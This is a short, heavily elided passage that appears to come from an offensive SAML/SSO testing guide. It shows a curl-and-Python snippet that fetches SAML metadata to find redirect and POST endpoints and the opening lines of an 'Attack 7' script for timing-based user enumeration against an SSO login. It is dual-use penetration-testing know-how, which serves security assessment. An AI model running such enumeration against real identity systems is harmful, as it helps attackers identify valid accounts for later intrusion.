...
## Automated SAML Endpoint Discovery
...
curl -sk --max-time 10 "$METADATA_URL" | python3 -c "
import sys
...
for el in root.iter():
    if 'Binding' in el.attrib:
        ...
        if 'HTTP-Redirect' in el.attrib['Binding'] or 'HTTP-POST' in el.attrib['Binding']:
...
## Attack 7: SSO Timing-Based User Enumeration

```bash
TARGET="$1"      # SSO login endpoint
USERS_FILE="$2"  # List of usernames/emails

echo "[*] SSO timing-based user enumeration"

# Valid users produce different response time than invalid — server checks LDAP/AD
...
## High-Value Misconfiguration Checks (Assertion-Level)
